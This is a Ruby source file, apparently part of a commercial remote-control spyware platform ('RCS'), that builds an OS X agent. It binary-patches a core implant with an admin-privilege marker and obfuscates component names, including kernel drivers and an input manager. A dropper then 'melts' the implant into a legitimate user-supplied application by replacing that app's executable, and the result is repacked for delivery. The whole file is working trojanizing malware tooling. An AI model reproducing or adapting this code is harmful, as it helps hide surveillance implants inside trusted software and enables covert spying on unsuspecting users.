#
#  Agent creation for osx
#

# from RCS::Common
require 'rcs-common/trace'

require 'plist'

module RCS
module DB

class BuildOSX < Build

  def initialize
    super
    @platform = 'osx'
  end

  def patch(params)
    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # invoke the generic patch method with the new params
    super

    # open the core and binary patch the parameter for the "require admin privs"
    file = File.open(path(params[:core]), 'rb+')
    content = file.read

    # working method marker
    begin
      method = params['admin'] ? 'Ah57K' : 'Ah56K'
      method += SecureRandom.random_bytes(27)
      content['iuherEoR93457dFADfasDjfNkA7Txmkl'] = method
    rescue
      raise "Working method marker not found"
    end

    file.rewind
    file.write content
    file.close

  end

  def scramble
    trace :debug, "Build: scrambling"

    core = scramble_name(@factory.seed, 3)
    core_backup = scramble_name(core, 32)
    dir = scramble_name(core[0..7], 7) + '.app'
    config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
    inputmanager = scramble_name(config, 2)
    driver = scramble_name(config, 4)
    driver64 = scramble_name(config, 16)
    xpc = scramble_name(config, 8)
    icon = "q45tyh"
        
    @scrambled = {core: core, dir: dir, config: config, inputmanager: inputmanager,
                  icon: icon, xpc: xpc, driver: driver, driver64: driver64}

    # call the super which will actually do the renaming
    # starting from @outputs and @scrambled
    super
    
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    # TODO: make the default exe an actual default app
    executable = path('default')
    @executable_name = 'install'

    # the user has provided a file to melt with
    if params and params['input']
      FileUtils.mv File.join(Dir.tmpdir, params['input']), path('input')

      exe = ''
      # unzip the application and extract the executable file
      Zip::ZipFile.open(path('input')) do |z|
        z.each do |f|
          if f.name['.app/Contents/Info.plist']
            puts f.name
            xml = z.file.open(f.name) {|x| x.read}
            exe = Plist::parse_xml(xml)['CFBundleExecutable']
            raise "cannot find CFBundleExecutable" if exe.nil?
            trace :debug, "Build: melting: executable provided into app is [#{exe}]"
          end
        end
        # rescan to search for the exe and extract it
        z.each do |f|
          if f.name["MacOS/#{exe}"]
            z.extract(f, path('exe'))
            executable = path('exe')
            @executable_name = f.name
          end
        end
      end
    end

    CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                        path(@scrambled[:config])+' '+
                                        path(@scrambled[:driver])+' '+
                                        path(@scrambled[:driver64])+' '+
                                        path(@scrambled[:inputmanager])+' '+
                                        path(@scrambled[:icon])+' '+
                                        path(@scrambled[:dir])+' '+
                                        executable + ' ' +
                                        path('output')

    File.exist? path('output') || raise("output file not created by dropper")

    trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"

    @outputs << 'output'



  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    # substitute the exec into the app
    if File.exist? path('input')
      trace :debug, "Build: pack: repacking the app with [#{@executable_name}]"

      Zip::ZipFile.open(path('input')) do |z|
        z.file.open(@executable_name, 'w') {|f| f.write File.open(path('output'), 'rb') {|f| f.read} }
        z.file.chmod(0755, @executable_name)
      end

      FileUtils.mv(path('input'), path('output.zip'))

      # this is the only file we need to output after this point
      @outputs = ['output.zip']

      return
    end

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open(@executable_name, "w") { |f| f.write File.open(path('output'), 'rb') {|f| f.read} }
      z.file.chmod(0755, @executable_name)
    end

    # TODO: remove this when the correct method has been found
    #binary_patch_exec_bit('output.zip', @executable_name)

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end


  def binary_patch_exec_bit(zipfile, filename)
    content = File.open(path(zipfile), 'rb') {|f| f.read}

    # magic voodoo by Fabio
    offset = content.rindex(filename) - 46
    if offset > 0 and content.byteslice(offset, 4) == "\x50\x4b\x01\x02"
      content[offset + 4] = "\x17"
      content[offset + 5] = "\x03"    # FS_TYPE_UNIX
      content[offset + 38] = "\x00"   # extended attributes  0755
      content[offset + 39] = "\x00"
      content[offset + 40] = "\xed"
      content[offset + 41] = "\x81"
    end

    File.open(path('output.zip'), 'wb') {|f| f.write content}
  end

end

end #DB::
end #RCS::
